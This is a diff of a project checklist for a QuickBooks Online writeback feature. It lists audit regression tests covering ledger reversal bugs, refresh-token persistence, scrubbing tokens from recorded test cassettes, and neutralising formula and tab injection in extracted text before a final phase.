 - [ ] **DoD 6 satisfied** — QBO draft writeback against sandbox with idempotency, closed-period refusal and reversal proven by test
+
+**Audit regressions that must be green (`2026-08-29-REVISIONS.md`):**
+
+- [ ] `test_a_write_after_a_reversal_creates_a_new_bill_not_a_dead_replay` — **F-39, the worst defect in this
+      phase.** Reversal left the ledger `committed` with a deleted remote id, so the next write returned
+      `was_replay=True` pointing at an object that no longer exists, and the audit recorded a write that did not
+      happen
+- [ ] `test_line_item_rejects_a_float_amount` actually passes — **F-01, verified failing as originally written**
+- [ ] `test_a_formula_in_an_extracted_description_is_neutralised` and
+      `test_a_tab_in_a_description_cannot_inject_an_extra_iif_transaction` — **F-27.** The input is
+      attacker-influenced by construction, and the output opens in Excel
+- [ ] `test_no_cassette_contains_a_token` green **and** `before_record_response` present — F-28; VCR never
+      scrubbed response bodies, and that is where the token is
+- [ ] `test_different_queries_do_not_replay_each_others_responses` — F-29
+- [ ] `test_the_rotated_refresh_token_is_persisted_before_the_retry` — **F-41.** Intuit rotates the refresh
+      token on every refresh; losing one locks the integration out permanently and surfaces days later
+- [ ] `test_a_reversal_after_a_restart_still_names_the_document` — F-42
+- [ ] `test_an_edited_entry_is_detected_and_named` — F-43; "append-only" was four missing method names
+- [ ] `test_a_rejected_write_records_its_reason_rather_than_sitting_pending` — F-44
+- [ ] `test_reversal_does_not_remove_a_row_that_merely_mentions_the_key` — F-45
+- [ ] **Q3 settled** and the `DocNumber` decision recorded in `docs/methodology.md` — F-40
 
 **Then Phase 6** — routing, calibration and close-out. That phase decides what the product is allowed to claim.
